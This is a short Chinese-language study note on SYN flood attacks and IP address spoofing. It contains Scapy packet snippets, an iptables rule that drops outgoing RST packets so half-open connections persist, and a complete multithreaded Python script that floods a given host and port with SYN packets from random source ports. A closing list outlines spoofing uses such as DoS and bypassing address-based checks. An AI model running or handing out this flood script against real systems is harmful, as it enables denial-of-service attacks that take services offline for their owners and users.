
# Syn-flood和IP地址欺骗

* Syn-flood

* IP地址欺骗

## Syn-flood

* Scapy
```python
i = IP()
i.dst = 1.1.1.1
i.display()
t = TCP()
sr1(i/t, verbose = 1, timeout=3)
sr1(IP(dst=1.1.1.1)/TCP())
```
**linux本机默认会回应返回的数据包，关闭指令：** 
```shell 
iptables -A OUTPUT -p tcp --tcp-flags RST RST -d 1.1.1.1 -j DROP
```
* 实例1
```python
#!/usr/bin/python
# _*_ coding:utf8 _*_
 
from scapy.all import *
from time import sleep
import thread
import random
import logging
logging.getLogger('scapy.runtime').setLevel(logging.ERROR)
 
if len(sys.argv) !=4:
    print("EXAMPLE:./syn_flood.py 1.1.1.1 80 20")
    sys.exit()
 
target =str(sys.argv[1])
port = int(sys.argv[2])
threads = int(sys.argv[3])
 
print("SYN flood attacking........, Press Ctrl + c STOP attack")
def synflood(target,port):
    while 0 == 0:
        x = random.randint(0,65535)
        send(IP(dst=target)/TCP(dport=port,sport=x),verbose=0)
 
for x in range(0,threads):
    thread.start_new_thread(synflood,(target,port))
while 0 == 0:
    sleep(1)
```

## IP地址欺骗
> * 经常用于DoS攻击  
> * 根据IP头地址寻址  
>   - 伪造IP源地址
> * 边界路由器过滤
>   - 入站、出站
> * 受害者可能是源、目的地址
> * 绕过基于地址的验证
> * 压力测试模拟多用户
> * 上层协议(TCP序列号)


